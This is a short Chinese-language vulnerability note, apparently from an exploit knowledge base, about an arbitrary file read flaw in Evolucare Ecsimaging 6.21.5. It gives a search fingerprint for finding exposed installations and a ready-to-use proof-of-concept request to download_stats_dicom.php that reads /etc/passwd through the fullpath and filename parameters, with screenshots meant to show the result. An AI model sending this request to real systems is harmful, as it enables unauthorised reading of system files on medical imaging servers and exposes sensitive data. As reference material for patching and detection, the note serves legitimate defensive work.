# Evolucare Ecsimaging download_stats_dicom.php 任意文件读取漏洞

## 漏洞描述

Evolucare Ecsimaging download_stats_dicom.php 存在文件读取漏洞,攻击者可利用该漏洞获取系统敏感信息等.

## 漏洞影响

<a-checkbox checked>EVOLUCARE Evolucare Ecsimaging 6.21.5</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="ECSimaging"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1645546475187-0a083488-f138-4905-97d4-d59cffe9d11c-20220313153823825.png)

验证POC

```javascript
/download_stats_dicom.php?fullpath=/etc/passwd&filename=/etc/passwd
```

![img](../../../.vuepress/public/img/1645546522769-c4a3e88c-e234-49f9-b1f6-2d49742683b0.png)